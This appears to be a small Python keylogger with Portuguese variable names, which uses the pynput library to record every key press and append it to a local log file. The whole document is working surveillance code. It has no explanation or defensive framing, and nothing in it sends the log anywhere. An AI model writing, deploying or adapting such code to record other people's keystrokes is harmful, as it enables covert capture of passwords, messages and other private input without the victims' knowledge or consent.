from pynput.keyboard import Listener
import re 

arquivolog = "\Users\key.log"

def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'key.space', ' ', tecla)
    tecla = re.sub(r'key.enter', '\n', tecla)
    tecla = re.sub(r'key.*', '', tecla)

    with open(arquivolog, "a") as log:
        log.write(tecla)

with Listener(on_press=capturar) as l:
    l.join()